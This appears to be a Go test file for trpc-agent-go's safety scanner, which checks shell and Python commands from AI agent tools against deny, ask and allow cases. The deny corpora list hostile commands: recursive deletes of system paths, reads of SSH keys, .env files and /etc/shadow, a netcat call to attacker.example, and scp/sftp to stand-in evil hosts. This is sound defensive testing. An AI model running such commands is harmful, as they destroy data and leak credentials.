//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"encoding/json"
	"testing"
)

func TestIndependentMandatoryRiskCorpus(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"cat",
		"head",
		"curl",
		"wget",
	}
	policy.NetworkAllowlist = []string{
		"github.com",
	}

	scanner := NewScanner(policy)

	tests := []struct {
		name     string
		command  string
		category string
		wantRule string
	}{
		{
			name:     "absolute rm with long flags",
			command:  "/bin/rm --recursive --force /var",
			category: "dangerous-delete",
			wantRule: ruleDangerousDelete,
		},
		{
			name:     "split recursive force flags",
			command:  "rm -r -f ./build-cache",
			category: "dangerous-delete",
			wantRule: ruleDangerousDelete,
		},
		{
			name:     "combined reversed flags",
			command:  "rm -fr ../generated",
			category: "dangerous-delete",
			wantRule: ruleDangerousDelete,
		},
		{
			name:     "system path without recursive flag",
			command:  "rm /etc",
			category: "dangerous-delete",
			wantRule: ruleDangerousDelete,
		},
		{
			name:     "relative nested dotenv",
			command:  "head -n 1 ../secrets/.env",
			category: "sensitive-path",
			wantRule: ruleSensitivePath,
		},
		{
			name:     "expanded home SSH key",
			command:  "cat $HOME/.ssh/id_ed25519",
			category: "sensitive-path",
			wantRule: ruleSensitivePath,
		},
		{
			name:     "case folded npm credentials",
			command:  "cat ./config/.NPMRC",
			category: "sensitive-path",
			wantRule: ruleSensitivePath,
		},
		{
			name:     "relative credentials file",
			command:  "cat ../auth/credentials",
			category: "sensitive-path",
			wantRule: ruleSensitivePath,
		},
		{
			name: "allowlisted domain used as prefix",
			command: "curl " +
				"https://github.com.evil.example/archive",
			category: "network-domain",
			wantRule: ruleNetwork,
		},
		{
			name: "similar but non-subdomain host",
			command: "wget " +
				"https://evilgithub.com/package.tar.gz",
			category: "network-domain",
			wantRule: ruleNetwork,
		},
		{
			name: "SSH with option and user",
			command: "ssh -p 2222 " +
				"user@deploy.evil.example",
			category: "network-domain",
			wantRule: ruleNetwork,
		},
		{
			name: "SCP to non-allowlisted IP",
			command: "scp ./artifact " +
				"user@192.0.2.10:/tmp/artifact",
			category: "network-domain",
			wantRule: ruleNetwork,
		},
	}

	categoryTotal := map[string]int{}
	categoryDenied := map[string]int{}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			categoryTotal[tc.category]++

			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName: "workspace_exec",
					Command:  tc.command,
					Backend:  BackendWorkspaceExec,
				},
			)
			if err != nil {
				t.Fatalf(
					"Scanner.Scan() error = %v",
					err,
				)
			}

			if report.Decision == DecisionDeny {
				categoryDenied[tc.category]++
			}

			if report.Decision != DecisionDeny {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					DecisionDeny,
					report,
				)
			}

			if !reportHasRule(report, tc.wantRule) {
				t.Errorf(
					"Findings do not contain rule %q: %+v",
					tc.wantRule,
					report.Findings,
				)
			}
		})
	}

	for _, category := range []string{
		"dangerous-delete",
		"sensitive-path",
		"network-domain",
	} {
		total := categoryTotal[category]
		denied := categoryDenied[category]

		if total == 0 {
			t.Fatalf(
				"category %q has no samples",
				category,
			)
		}

		if denied != total {
			t.Errorf(
				"%s detection = %d/%d, want 100%%",
				category,
				denied,
				total,
			)
		}
	}
}

func reportHasRule(
	report ScanReport,
	wantRule string,
) bool {
	for _, finding := range report.Findings {
		if finding.RuleID == wantRule {
			return true
		}
	}
	return false
}

func TestIndependentAdditionalHighRiskCorpus(
	t *testing.T,
) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"cat",
		"echo",
		"curl",
	}
	policy.NetworkAllowlist = []string{
		"github.com",
	}

	scanner := NewScanner(policy)

	tests := []struct {
		name     string
		request  ScanRequest
		wantRule string
	}{
		{
			name: "bash command wrapper",
			request: ScanRequest{
				Command: "bash -c 'echo harmless'",
			},
			wantRule: ruleCommandPolicy,
		},
		{
			name: "eval command wrapper",
			request: ScanRequest{
				Command: "eval 'echo harmless'",
			},
			wantRule: ruleCommandPolicy,
		},
		{
			name: "sudo privilege wrapper",
			request: ScanRequest{
				Command: "sudo ls /tmp",
			},
			wantRule: ruleCommandPolicy,
		},
		{
			name: "su privilege wrapper",
			request: ScanRequest{
				Command: "su root",
			},
			wantRule: ruleCommandPolicy,
		},
		{
			name: "inline API key",
			request: ScanRequest{
				Command: "echo " +
					"api_key=sk-abcdefghijklmnop",
			},
			wantRule: ruleSecret,
		},
		{
			name: "authorization bearer header",
			request: ScanRequest{
				Command: "curl -H " +
					"'Authorization: Bearer " +
					"abcdefghijklmnop123456' " +
					"https://github.com/data",
			},
			wantRule: ruleSecret,
		},
		{
			name: "GitHub token in environment",
			request: ScanRequest{
				Command: "echo ready",
				Env: map[string]string{
					"PATH": "ghp_" +
						"ABCDEFGHIJKLMNOPQRSTUVWXYZ123456",
				},
			},
			wantRule: ruleSecret,
		},
		{
			name: "while true infinite loop",
			request: ScanRequest{
				Command: "while true; " +
					"do echo tick; done",
			},
			wantRule: ruleInfiniteLoop,
		},
		{
			name: "C style infinite loop",
			request: ScanRequest{
				Command: "for ((;;)); " +
					"do echo tick; done",
			},
			wantRule: ruleInfiniteLoop,
		},
		{
			name: "overwrite system configuration",
			request: ScanRequest{
				Command: "echo data > /etc/passwd",
			},
			wantRule: ruleDangerousDelete,
		},
		{
			name: "read shadow password file",
			request: ScanRequest{
				Command: "cat /etc/shadow",
			},
			wantRule: ruleSensitivePath,
		},
		{
			name: "netcat non-allowlisted host",
			request: ScanRequest{
				Command: "nc attacker.example 4444",
			},
			wantRule: ruleNetwork,
		},
		{
			name: "SFTP non-allowlisted host",
			request: ScanRequest{
				Command: "sftp user@files.evil.example",
			},
			wantRule: ruleNetwork,
		},
	}

	denied := 0

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			req := tc.request
			req.ToolName = "workspace_exec"
			req.Backend = BackendWorkspaceExec

			report, err := scanner.Scan(
				context.Background(),
				req,
			)
			if err != nil {
				t.Fatalf(
					"Scanner.Scan() error = %v",
					err,
				)
			}

			if report.Decision == DecisionDeny {
				denied++
			}

			if report.Decision != DecisionDeny {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					DecisionDeny,
					report,
				)
			}

			if !report.Blocked {
				t.Errorf(
					"Blocked = false, want true",
				)
			}

			if report.RuleID == "" {
				t.Errorf(
					"RuleID is empty: %+v",
					report,
				)
			}

			if !reportHasRule(report, tc.wantRule) {
				t.Errorf(
					"Findings do not contain rule %q: %+v",
					tc.wantRule,
					report.Findings,
				)
			}
		})
	}

	if denied != len(tests) {
		t.Fatalf(
			"additional high-risk detection = %d/%d, want 100%%",
			denied,
			len(tests),
		)
	}

	t.Logf(
		"additional high-risk detection = %d/%d (100%%)",
		denied,
		len(tests),
	)
}

func TestIndependentSafeCorpus(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"go",
		"git",
		"ls",
		"pwd",
		"cat",
		"curl",
		"echo",
		"printf",
		"find",
		"head",
		"wc",
		"true",
		"sleep",
	}
	policy.NetworkAllowlist = []string{
		"github.com",
	}

	scanner := NewScanner(policy)

	tests := []struct {
		name    string
		command string
	}{
		{
			name:    "go vet package",
			command: "go vet ./tool/safety",
		},
		{
			name:    "git diff summary",
			command: "git diff --stat",
		},
		{
			name:    "list safety directory",
			command: "ls -la tool/safety",
		},
		{
			name:    "print working directory",
			command: "pwd",
		},
		{
			name:    "dotenv example documentation",
			command: "cat docs/.env.example",
		},
		{
			name:    "credentials documentation",
			command: "cat docs/credentials.md",
		},
		{
			name:    "public SSH key filename",
			command: "cat docs/id_rsa.pub",
		},
		{
			name: "allowlisted domain with trailing dot",
			command: "curl " +
				"https://github.com./trpc-group",
		},
		{
			name: "allowlisted real subdomain",
			command: "curl " +
				"https://api.github.com/repos/trpc-group",
		},
		{
			name: "quoted dependency documentation",
			command: "echo " +
				"'npm install left-pad'",
		},
		{
			name:    "quoted delete documentation",
			command: "echo 'rm -rf /'",
		},
		{
			name: "quoted URL documentation",
			command: "echo " +
				"'curl https://download.evil.example/file'",
		},
		{
			name: "quoted loop documentation",
			command: "echo " +
				"'while true; do echo tick; done'",
		},
		{
			name: "quoted sensitive path documentation",
			command: "echo " +
				"'$HOME/.ssh/id_rsa'",
		},
		{
			name: "password policy text",
			command: "printf '%s\\n' " +
				"'password policy enabled'",
		},
		{
			name:    "find dotenv example",
			command: "find docs -name '.env.example'",
		},
		{
			name:    "read ordinary README",
			command: "head -n 5 README.md",
		},
		{
			name:    "count ordinary module file",
			command: "wc -l go.mod",
		},
		{
			name:    "successful no-op",
			command: "true",
		},
		{
			name:    "sleep equals policy limit",
			command: "sleep 300",
		},
	}

	const wantSafeSamples = 20
	if len(tests) != wantSafeSamples {
		t.Fatalf(
			"safe sample count = %d, want %d",
			len(tests),
			wantSafeSamples,
		)
	}

	falsePositives := 0

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName: "workspace_exec",
					Command:  tc.command,
					Backend:  BackendWorkspaceExec,
				},
			)
			if err != nil {
				t.Fatalf(
					"Scanner.Scan() error = %v",
					err,
				)
			}

			switch report.Decision {
			case DecisionAllow,
				DecisionAsk,
				DecisionDeny:
			default:
				t.Errorf(
					"invalid Decision %q",
					report.Decision,
				)
			}

			if report.RuleID == "" {
				t.Errorf(
					"RuleID is empty: %+v",
					report,
				)
			}

			if report.Decision != DecisionAllow {
				falsePositives++
				t.Logf(
					"false positive: decision=%s rule=%s findings=%+v",
					report.Decision,
					report.RuleID,
					report.Findings,
				)
			}
		})
	}

	falsePositiveRate :=
		float64(falsePositives) /
			float64(len(tests)) * 100

	t.Logf(
		"safe false-positive rate = %d/%d (%.1f%%)",
		falsePositives,
		len(tests),
		falsePositiveRate,
	)

	if falsePositives*100 > len(tests)*10 {
		t.Fatalf(
			"safe false-positive rate = %d/%d, want <= 10%%",
			falsePositives,
			len(tests),
		)
	}
}

func TestIndependentCodeExecSafeCorpus(t *testing.T) {
	policy := DefaultPolicy()
	policy.NetworkAllowlist = []string{"github.com"}
	scanner := NewScanner(policy)

	tests := []struct {
		name string
		code string
	}{
		{
			name: "print greeting",
			code: `print("hello")`,
		},
		{
			name: "integer arithmetic",
			code: `print((2 + 3) * 4)`,
		},
		{
			name: "list comprehension",
			code: `print([value * 2 for value in range(4)])`,
		},
		{
			name: "dictionary lookup",
			code: `values = {"safe": True}; print(values["safe"])`,
		},
		{
			name: "JSON serialization",
			code: `import json; print(json.dumps({"ok": True}))`,
		},
		{
			name: "date formatting",
			code: `from datetime import date; print(date(2026, 7, 31).isoformat())`,
		},
		{
			name: "regular expression",
			code: `import re; print(bool(re.fullmatch(r"[a-z]+", "safe")))`,
		},
		{
			name: "square root",
			code: `import math; print(math.sqrt(81))`,
		},
		{
			name: "path name inspection",
			code: `from pathlib import Path; print(Path(".").name)`,
		},
		{
			name: "read ordinary README",
			code: `print(open("README.md", encoding="utf-8").read(20))`,
		},
		{
			name: "parse allowlisted URL",
			code: `from urllib.parse import urlparse; print(urlparse("https://github.com/docs").hostname)`,
		},
		{
			name: "allowlisted HTTP request",
			code: `import requests; print(requests.get("https://github.com", timeout=5).status_code)`,
		},
		{
			name: "join ordinary path",
			code: `import os; print(os.path.join("docs", "guide.md"))`,
		},
		{
			name: "CSV in memory",
			code: `import csv, io; print(list(csv.reader(io.StringIO("a,b\n1,2"))))`,
		},
		{
			name: "SHA256 digest",
			code: `import hashlib; print(hashlib.sha256(b"public").hexdigest())`,
		},
		{
			name: "base64 encoding",
			code: `import base64; print(base64.b64encode(b"public").decode())`,
		},
		{
			name: "deterministic random",
			code: `import random; random.seed(1); print(random.randint(1, 10))`,
		},
		{
			name: "statistics mean",
			code: `import statistics; print(statistics.mean([1, 2, 3]))`,
		},
		{
			name: "enumeration value",
			code: `from enum import Enum; E = Enum("E", {"OK": 1}); print(E.OK.value)`,
		},
		{
			name: "data class",
			code: `from dataclasses import dataclass
@dataclass
class Item:
    name: str
print(Item("safe"))`,
		},
	}

	const wantSafeSamples = 20
	if len(tests) != wantSafeSamples {
		t.Fatalf(
			"codeexec safe sample count = %d, want %d",
			len(tests),
			wantSafeSamples,
		)
	}

	falsePositives := 0
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			args, err := json.Marshal(map[string]any{
				"code_blocks": []map[string]string{
					{
						"language": "python",
						"code":     tc.code,
					},
				},
			})
			if err != nil {
				t.Fatalf("json.Marshal() error = %v", err)
			}
			req, err := ScanRequestFromArgs("execute_code", args)
			if err != nil {
				t.Fatalf(
					"ScanRequestFromArgs() error = %v",
					err,
				)
			}

			report, err := scanner.Scan(context.Background(), req)
			if err != nil {
				t.Fatalf("Scanner.Scan() error = %v", err)
			}
			if report.Decision != DecisionAllow {
				falsePositives++
				t.Logf(
					"false positive: decision=%s rule=%s findings=%+v",
					report.Decision,
					report.RuleID,
					report.Findings,
				)
			}
		})
	}

	falsePositiveRate :=
		float64(falsePositives) /
			float64(len(tests)) * 100
	t.Logf(
		"codeexec safe false-positive rate = %d/%d (%.1f%%)",
		falsePositives,
		len(tests),
		falsePositiveRate,
	)
	if falsePositives*100 > len(tests)*10 {
		t.Fatalf(
			"codeexec safe false-positive rate = %d/%d, want <= 10%%",
			falsePositives,
			len(tests),
		)
	}
}

func TestIndependentReviewCorpus(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"echo",
		"wc",
		"go",
		"git",
		"npm",
		"sleep",
	}
	scanner := NewScanner(policy)

	tests := []struct {
		name     string
		request  ScanRequest
		wantRule string
	}{
		{
			name: "ordinary pipeline",
			request: ScanRequest{
				ToolName: "workspace_exec",
				Command:  "echo alpha | wc -c",
				Backend:  BackendWorkspaceExec,
			},
			wantRule: rulePipeline,
		},
		{
			name: "sequenced commands",
			request: ScanRequest{
				ToolName: "workspace_exec",
				Command: "go version && " +
					"git status --short",
				Backend: BackendWorkspaceExec,
			},
			wantRule: rulePipeline,
		},
		{
			name: "command substitution",
			request: ScanRequest{
				ToolName: "workspace_exec",
				Command:  "echo $(date)",
				Backend:  BackendWorkspaceExec,
			},
			wantRule: ruleParse,
		},
		{
			name: "ordinary output redirection",
			request: ScanRequest{
				ToolName: "workspace_exec",
				Command:  "echo hello > output.txt",
				Backend:  BackendWorkspaceExec,
			},
			wantRule: ruleParse,
		},
		{
			name: "dependency installation",
			request: ScanRequest{
				ToolName: "workspace_exec",
				Command:  "npm install left-pad",
				Backend:  BackendWorkspaceExec,
			},
			wantRule: ruleDependency,
		},
		{
			name: "sleep exceeds policy limit",
			request: ScanRequest{
				ToolName: "workspace_exec",
				Command:  "sleep 301",
				Backend:  BackendWorkspaceExec,
			},
			wantRule: ruleTimeout,
		},
		{
			name: "request timeout exceeds limit",
			request: ScanRequest{
				ToolName:   "workspace_exec",
				Command:    "echo ready",
				Backend:    BackendWorkspaceExec,
				TimeoutSec: 301,
			},
			wantRule: ruleTimeout,
		},
		{
			name: "output limit exceeds policy",
			request: ScanRequest{
				ToolName:       "workspace_exec",
				Command:        "echo ready",
				Backend:        BackendWorkspaceExec,
				MaxOutputBytes: (4 << 20) + 1,
			},
			wantRule: ruleOutput,
		},
		{
			name: "host PTY session",
			request: ScanRequest{
				ToolName: "exec_command",
				Command:  "echo ready",
				Backend:  BackendHostExec,
				TTY:      true,
			},
			wantRule: ruleHostPTY,
		},
		{
			name: "background execution",
			request: ScanRequest{
				ToolName:   "workspace_exec",
				Command:    "echo ready",
				Backend:    BackendWorkspaceExec,
				Background: true,
			},
			wantRule: ruleBackground,
		},
	}

	const wantReviewSamples = 10
	if len(tests) != wantReviewSamples {
		t.Fatalf(
			"review sample count = %d, want %d",
			len(tests),
			wantReviewSamples,
		)
	}

	asked := 0

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				tc.request,
			)
			if err != nil {
				t.Fatalf(
					"Scanner.Scan() error = %v",
					err,
				)
			}

			if report.Decision == DecisionAsk {
				asked++
			}

			if report.Decision != DecisionAsk {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					DecisionAsk,
					report,
				)
			}

			if !report.Blocked {
				t.Errorf(
					"Blocked = false, want true",
				)
			}

			if report.RuleID == "" {
				t.Errorf(
					"RuleID is empty: %+v",
					report,
				)
			}

			if len(report.Evidence) == 0 {
				t.Errorf(
					"Evidence is empty: %+v",
					report,
				)
			}

			if report.Recommendation == "" {
				t.Errorf(
					"Recommendation is empty: %+v",
					report,
				)
			}

			if !reportHasRule(report, tc.wantRule) {
				t.Errorf(
					"Findings do not contain rule %q: %+v",
					tc.wantRule,
					report.Findings,
				)
			}
		})
	}

	reviewRate :=
		float64(asked) /
			float64(len(tests)) * 100

	t.Logf(
		"review decision accuracy = %d/%d (%.1f%%)",
		asked,
		len(tests),
		reviewRate,
	)

	if asked != len(tests) {
		t.Fatalf(
			"review decisions = %d/%d, want 100%% ask",
			asked,
			len(tests),
		)
	}
}
